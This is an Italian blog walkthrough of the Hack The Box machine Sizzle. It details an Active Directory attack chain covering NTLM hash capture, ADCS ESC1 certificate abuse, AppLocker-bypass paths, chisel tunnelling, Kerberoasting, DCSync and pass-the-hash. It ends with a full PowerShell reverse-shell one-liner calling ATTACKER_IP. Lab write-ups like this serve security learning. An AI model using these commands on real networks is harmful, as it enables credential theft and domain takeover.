---
title: 'HTB Sizzle Walkthrough: ADCS ESC1, Kerberoasting, DCSync'
slug: sizzle-walkthrough-hack-the-box
description: 'Writeup completo di Hack The Box Sizzle (Insane): SCF attack, ADCS ESC1, AppLocker bypass, Kerberos bloccato, BloodHound e DCSync fino ad Administrator.'
image: /sizzle-walkthrough-hack-the-box.webp
draft: true
date: 2026-06-18T00:00:00.000Z
categories:
  - walkthroughs
subcategories:
  - hard
tags:
  - HTB Walkthrough
  - write up htb insane
---

# HTB Sizzle Walkthrough: dalla SCF Attack al Domain Admin via ADCS e DCSync

Sizzle è una macchina Windows di Hack The Box classificata come **Insane**, basata su un ambiente Active Directory completo (dominio HTB.LOCAL). Ma va detto subito una cosa che quasi nessun writeup dice chiaramente: la difficoltà reale di Sizzle non sta nelle tecniche usate, che sono tutte ben documentate (SCF attack, ADCS, Kerberoasting, DCSync). Sta nel fatto che **Kerberos (porta 88) è filtrato dall'esterno**, quindi ogni tool che dialoga via Kerberos (GetUserSPNs, secretsdump in certi flussi) va fatto passare attraverso un tunnel locale. Capito questo, il resto è "solo" execution di una catena AD classica.

## Perché viene segnata Insane

Non per la complessità degli exploit, ma perché se non capisci subito che TCP/88 è bloccato, perdi ore a chiederti perché kerbrute funziona (usa UDP) e GetUserSPNs.py si blocca a `s.connect()` senza errore, senza timeout, in apparenza senza motivo. Un controllo rapido con tcpdump mostra SYN ripetuti senza SYN-ACK: il pacchetto parte, la porta non risponde. Da lì la soluzione è instradare il traffico Kerberos dentro un tunnel (es. chisel) verso 127.0.0.1 sulla macchina compromessa, e farlo dialogare in locale dove la porta non è filtrata.

## Enumerazione iniziale

Nmap rivela un set di porte tipico di un Domain Controller: FTP (anonimo, ma vuoto), IIS su 80/443, LDAP su 389/636/3268/3269, SMB su 445, WinRM su 5985/5986. La porta 443 espone un certificato SSL emesso da una CA chiamata `HTB-SIZZLE-CA` — primo indizio che sul dominio gira **Active Directory Certificate Services (ADCS)**.

Sul web server di base non c'è nulla di interessante, solo una pagina statica. Un directory brute-forcing però scopre `/certsrv` — l'interfaccia web di richiesta certificati di ADCS — e `/certenroll`. Questo endpoint diventa centrale più avanti.

Sul lato SMB, l'autenticazione null/guest è abilitata. Con `smbclient` si lista subito tutto senza credenziali:

```bash
smbclient -L //10.129.21.43/ -N
```

```
Sharename          Type      Comment
---------          ----      -------
ADMIN$             Disk      Remote Admin
C$                 Disk      Default share
CertEnroll         Disk      Active Directory Certificate Services share
Department Shares  Disk
IPC$               IPC       Remote IPC
NETLOGON           Disk      Logon server share
Operations         Disk
SYSVOL             Disk      Logon server share
```

La share `CertEnroll` confirma da subito la presenza di ADCS anche lato SMB, non solo via web. Si entra in "Department Shares":

```bash
smbclient //10.129.21.43/"Department Shares" -N
```

Dentro c'è una cartella per ogni reparto aziendale (Accounting, HR, Finance, Legal, IT, Security, ecc.) — tipica struttura "realistica" di Sizzle. Una di queste, `ZZ_ARCHIVE`, contiene decine di file con estensioni eterogenee (`.pptx`, `.doc`, `.mov`, `.ogg`, ecc.) tutti della stessa dimensione esatta (419430 byte): sono file segnaposto/decoy, non documenti reali. Scaricarli e passarli a `strings` non produce nulla di utile — è tempo perso, un classico red herring per chi enumera senza criterio.

La cartella che conta è `Users`, dentro "Department Shares": elenca le home di vari account (`amanda`, `amanda_adm`, `bill`, `bob`, `chris`, `henry`, `joe`, `jose`, `morgan`, `mrb3n`...) più una cartella `Public` con data di modifica molto più recente delle altre — quello è il segnale che è scrivibile, ed è lì che si caricano i file civetta.

## Una deviazione: Zerologon

Essendo Sizzle un box vecchio (Windows Server 2016, online dal 2018), il Domain Controller risulta vulnerabile anche a **Zerologon (CVE-2020-1472)** — un bug nell'implementazione del protocollo Netlogon che permette di azzerare l'hash della password del computer account del DC senza credenziali, e da lì impersonare il DC stesso. Vale la pena provarlo, anche solo per passatempo, dato che è una CVE nota e ben documentata su una macchina che lo permette ancora.

Non è però la strada pensata per la macchina: Zerologon è un colpo "a sorpresa" di sistema, non richiede di seguire nessuna delle tecniche AD viste in questo articolo, e bypassa completamente l'apprendimento su ADCS, AppLocker e Kerberoasting che è il vero contenuto didattico di Sizzle. Utile da conoscere, ma se l'obiettivo è imparare la catena, meglio lasciarlo da parte e proseguire con ADCS.

## Foothold: ntlm\_theft + Responder

Invece di costruire a mano un file `.scf`, si usa `ntlm_theft` — genera in un colpo tutte le varianti di file "civetta" (`.scf`, `.url`, `.lnk`, `.library-ms`, ecc.) che, semplicemente venendo *visti* da Explorer (anche senza essere apertI), forzano una richiesta di autenticazione SMB verso l'IP che indichi:

```bash
ntlm_theft -s 10.10.14.143 -f hackita_documents -g all
```

`-g all` genera tutte le tecniche disponibili in una sola cartella (`hackita_documents`), così non devi indovinare quale formato innescherà l'autenticazione su quel sistema specifico — li carichi tutti nella share scrivibile e lasci che sia Windows a "abboccare" al primo che riesce a processare.

Concetto dietro il file `.scf`: ha un campo icona che punta a un percorso UNC (`\\IP_ATTACCANTE\share\file.ico`). Nel momento in cui Explorer renderizza l'icona (anche senza che nessuno apra il file), Windows tenta un'autenticazione SMB verso quel percorso. Se hai Responder in ascolto, catturi l'hash NetNTLMv2 di chiunque sfogli quella cartella con privilegi elevati.

Flusso:

1. Generi i file civetta con `ntlm_theft` puntati al tuo IP.
2. Li carichi nella cartella `Public` scrivibile, dentro "Department Shares\Users".
3. Avvii Responder in ascolto.
4. Aspetti — un processo amministrativo passa sulla share, "vede" uno dei file, e ricevi una risposta NetNTLMv2.
5. L'hash catturato appartiene all'utente `amanda`. Si cracca con John o Hashcat usando una wordlist, ottenendo la password in chiaro `Ashare1972`.

Errore tipico: pensare che serva un click umano. Non serve — basta che Explorer (o un processo che enumera la share) risolva l'icona del file.

## Da credenziali a shell: ADCS al posto di WinRM diretto

Con `amanda:Ashare1972` si potrebbe pensare di autenticarsi direttamente su WinRM (5985/5986). Non funziona — l'utente non ha permessi sufficienti per una sessione interattiva standard. La via d'accesso passa per i certificati.

Prima di richiedere un certificato a caso, conviene capire quali template sono effettivamente abusabili. `certipy find` enumera la CA e segnala le vulnerabilità note (ESC1-ESC16):

```bash
certipy find -u amanda -p 'Ashare1972' -dc-ip 10.129.21.43 -vulnerable -enabled -stdout
```

Sul template `SSL` l'output segnala due cose chiave (per la spiegazione completa di ogni codice ESC, vedi la guida su [ADCS: ESC1-ESC16](https://hackita.it/articoli/adcs-esc1-esc16/)):

* **ESC1**: il template ha `Enrollee Supplies Subject` attivo (il richiedente può specificare lui stesso il Subject/UPN del certificato) insieme a `Client Authentication` abilitato — significa che chiunque possa enrollare può chiedere un certificato *a nome di qualsiasi altro utente*, semplicemente specificando il suo UPN nella richiesta.
* **ESC4**: gli "Authenticated Users" hanno permessi di controllo pericolosi sull'oggetto template stesso (Full Control / Write Owner / Write Dacl).

In più, la CA ha **ESC8** (Web Enrollment esposto anche su HTTP semplice, oltre HTTPS). Per Sizzle l'ESC1 è quello che conta: è la ragione tecnica per cui si può richiedere un certificato con `-upn amanda@htb.local` e, più avanti, `-upn mrlky@htb.local`, ottenendo l'identità di un altro utente solo perché il template permette di "auto-dichiarare" il subject.

Usando `certipy req`, si richiede un certificato per l'utente `amanda` alla CA del dominio:

```bash
certipy req -u amanda@htb.local -p 'Ashare1972' -dc-ip 10.129.21.43 \
  -target SIZZLE.HTB.LOCAL -ca HTB-SIZZLE-CA -template SSL \
  -upn amanda@htb.local -sid <SID_AMANDA>
```

Il certificato emesso autentica su WinRM **in alternativa alla password**, perché WinRM su HTTPS (porta 5986) accetta certificate-based authentication quando il certificato è legato a un account valido tramite l'UPN/SID. Per i dettagli di configurazione di questa connessione, vedi la guida su [WinRM su HTTPS (porta 5986)](https://hackita.it/articoli/porta-5986-winrm-https/).

Dal PFX ottenuto si estraggono certificato e chiave privata:

```bash
openssl pkcs12 -in amanda.pfx -clcerts -nokeys -out cert.pem
openssl pkcs12 -in amanda.pfx -nocerts -out key.pem -nodes
```

E si entra:

```bash
evil-winrm -i sizzle.HTB.LOCAL -c cert.pem -k key.pem -S
```

Punto concettuale importante, spesso sottovalutato: **una chiave privata e un certificato non "contengono" una password**. Sono materiale crittografico che *sostituisce* la password come metodo di autenticazione su quel canale specifico — non c'è nulla da "estrarre" da un keypair RSA in termini di credenziali testuali.

## Secondo utente: mrlky, AppLocker e il pivot Kerberos

Enumerando i membri di "Remote Management Users" si trova un secondo account, `mrlky`, anch'esso abilitato a WinRM (e sfruttabile con lo stesso ESC1 visto sopra, semplicemente cambiando UPN nella richiesta):

```bash
certipy req -u amanda@htb.local -p 'Ashare1972' -dc-ip 10.129.21.43 \
  -target SIZZLE.HTB.LOCAL -ca HTB-SIZZLE-CA -template SSL \
  -upn mrlky@htb.local -sid <SID_MRLKY>
```

Una volta dentro come `mrlky` via evil-winrm con certificato, la PowerShell è vincolata da AppLocker e Constrained Language Mode — caricare ed eseguire binari arbitrari fallisce nella maggior parte dei percorsi. Le cartelle che vale sempre la pena testare per upload/esecuzione quando c'è AppLocker di mezzo, perché spesso restano fuori dalle regole di whitelisting:

```
c:\windows\system32\microsoft\crypto\rsa\machinekeys
c:\windows\system32\tasks_migrated\microsoft\windows\pla\system
c:\windows\syswow64\tasks\microsoft\windows\pla\system
c:\windows\debug\wia
c:\windows\system32\tasks
c:\windows\syswow64\tasks
c:\windows\tasks
c:\windows\registration\crmlog
c:\windows\system32\com\dmp
c:\windows\system32\fxstmp
c:\windows\system32\spool\drivers\color
c:\windows\system32\spool\printers
c:\windows\system32\spool\servers
c:\windows\syswow64\com\dmp
c:\windows\syswow64\fxstmp
c:\windows\temp
c:\windows\tracing
```

Sono percorsi tipicamente scrivibili da utenti standard e spesso esclusi dalle regole AppLocker basate su path, perché pensati per dati applicativi/spool piuttosto che eseguibili (es. `spool\drivers\color`, dove tipicamente finiscono i profili colore delle stampanti, non eseguibili). Da una di queste cartelle si carica il binario client di **chisel**.

Un primo tentativo ovvio — forward diretto della porta 88 verso l'attaccante — fallisce con un errore di questo tipo:

```
client: Connecting to ws://ATTACKER_IP:8888
2026/06/18 08:34:36 Client cannot listen on 88=>9090
```

Il motivo è semplice: la porta 88 **è già occupata sulla stessa macchina** dal vero servizio Kerberos (lsass). Il client chisel, eseguito sulla macchina compromessa, non può bindare localmente una porta già in uso dal sistema stesso — non è un problema di rete, è un conflitto di porta locale.

La soluzione è la modalità reverse SOCKS, che non richiede di bindare nessuna porta specifica sulla macchina target:

```bash
# lato attaccante, server in ascolto
chisel server -p 8888 --reverse

# lato target (Windows), client in reverse SOCKS
.\c.exe client ATTACKER_IP:8888 R:socks
```

Con il tunnel SOCKS attivo, si instradano i tool Kerberos attraverso `proxychains` configurato su quel SOCKS, così che la connessione alla porta 88 avvenga **dall'interno della rete del target verso se stesso** (127.0.0.1), dove il filtro esterno non esiste — il filtro infatti blocca solo le connessioni che arrivano da fuori, non il traffico locale della macchina.

Con il tunnel attivo, si lancia il Kerberoasting passando per il loopback locale tramite proxychains:

```bash
nxc ldap 127.0.0.1 -u amanda -p 'Ashare1972' --kerberoasting output.txt
```

Questo restituisce un ticket TGS cifrato (`$krb5tgs$23$...`) associato a un SPN registrato su `mrlky` stesso. Si cracca offline con John:

```bash
john --wordlist=wordlist.txt ticket.txt
```

ottenendo la password in chiaro dell'account.

## Mappare i privilegi: BloodHound / RustHound-CE

Prima di lanciare DCSync alla cieca, conviene sapere CHI ha davvero i diritti di replicazione sul dominio. Per la raccolta dati si può usare `rusthound-ce` invece del classico collector Python di BloodHound-CE:

```bash
rusthound-ce -d htb.local -u amanda -p 'Ashare1972' -z
```

RustHound-CE è una reimplementazione in Rust del collector — più veloce, e nella pratica raccoglie più oggetti/attributi rispetto al collector standard di BloodHound-CE sullo stesso dominio (copre meglio ACL, sessioni e alcuni attributi di certificate template). Per un ambiente AD con ADCS in mezzo come questo, è la scelta preferibile.

Caricando i dati raccolti nell'interfaccia BloodHound, una query sui diritti di replicazione (`Get Object Owner` / edge `GetChangesAll` + `GetChanges`) mostra che `mrlky` ha entrambi i privilegi necessari per il **DCSync**: `Replicating Directory Changes` e `Replicating Directory Changes All`. Questo è ciò che rende `mrlky`, e non un altro utente, il target finale della catena.

## Escalation finale: DCSync

Confermato via BloodHound che `mrlky` ha diritti di replicazione sul dominio, si procede con `secretsdump.py` e le sue credenziali:

```bash
secretsdump.py 'HTB.LOCAL'/'mrlky':'<password>'@'sizzle.HTB.LOCAL'
```

Impacket usa il metodo DRSUAPI per richiedere al DC una replica dei dati delle password — esattamente quello che fa un Domain Controller secondario durante una sincronizzazione legittima, solo che qui lo fa un account che non dovrebbe avere quel privilegio. Risultato: hash NTLM e chiavi Kerberos di **tutti** gli account del dominio, incluso Administrator.

Da lì, pass-the-hash diretto:

```bash
nxc smb 10.129.21.43 -u administrator -H <NTLM_HASH_ADMIN>
```

Risposta `(Pwn3d!)` — accesso completo come Administrator. Da qui si può eseguire un comando diretto, oppure ottenere una shell interattiva con una reverse shell PowerShell passata via `-x`:

```bash
nxc smb 10.129.21.43 -u administrator -H <NTLM_HASH_ADMIN> -x "powershell -ep bypass -c \"$c=New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=([text.encoding]::ASCII).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$o2=$o+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($o2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()\""
```

Concetto: lo script apre una connessione TCP verso la macchina attaccante (in ascolto con `nc -lvnp 4444`), riceve comandi sul socket, li esegue con `iex` (Invoke-Expression), e rimanda l'output indietro sullo stesso canale — è una reverse shell PowerShell pura, senza dipendenze esterne, utile quando AppLocker blocca altri eseguibili ma PowerShell stesso resta consentito.

root.txt si recupera poi normalmente via wmiexec o evil-winrm.

## Riepilogo della catena

1. SMB null/guest auth (`smbclient`) → share scrivibile in "Department Shares\Users\Public"
2. (Deviazione opzionale: Zerologon CVE-2020-1472, possibile ma fuori percorso)
3. `ntlm_theft` + Responder → NetNTLMv2 hash di `amanda`
4. Crack hash → password in chiaro
5. `certipy find` → ESC1 sul template SSL → `certipy req` → certificato → accesso WinRM via certificato, non via password
6. Da `amanda` si scopre `mrlky` in Remote Management Users → stesso ESC1, certificato per `mrlky`
7. AppLocker bypass tramite cartelle non vincolate → upload chisel
8. Tunnel sulla porta 88 (bloccata dall'esterno) → Kerberoasting funzionante
9. Crack TGS → credenziali aggiuntive
10. RustHound-CE + BloodHound → conferma diritti DCSync su `mrlky`
11. DCSync → hash di Administrator
12. Pass-the-hash → Administrator, root.txt

Ogni singolo passaggio, preso isolatamente, è documentato e relativamente standard in un ambiente AD. Quello che rende Sizzle "Insane" è la combinazione e, soprattutto, il fatto che il filtro su Kerberos costringe a fermarsi, capire **perché** un tool si blocca senza errore, e risolvere il problema di rete prima ancora di poter applicare la tecnica che già conosci.

## Risorse

* [Certipy (ly4k) — repository ufficiale](https://github.com/ly4k/Certipy): il tool usato per l'intera catena ADCS, dall'enumerazione ESC1-ESC16 fino alla richiesta dei certificati.
